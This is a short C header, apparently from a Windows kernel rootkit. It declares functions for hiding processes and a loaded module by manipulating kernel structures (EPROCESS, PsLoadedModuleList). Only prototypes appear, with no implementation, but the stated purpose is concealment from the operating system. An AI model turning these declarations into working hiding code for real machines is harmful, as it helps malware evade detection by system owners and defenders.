#ifndef _RK_DKOM_H_
#define _RK_DKOM_H_

#include <ntddk.h>
#include "rootkit.h"

BOOLEAN OnProcessHide(IN ULONG pid);
ULONG FindProcessEPROCByPid( int terminate_PID );
ULONG FindProcessEPROCByName(char procName[]);
BOOLEAN HideProcessFromProcessList( PEPROCESS eproc);
BOOLEAN HideModule();
ULONG FindPsLoadedModuleList (IN PDRIVER_OBJECT  DriverObject);
PMODULE_ENTRY FindModuleEntry(PMODULE_ENTRY pPsLoadedModuleList, PUNICODE_STRING usModuleName);


#endif
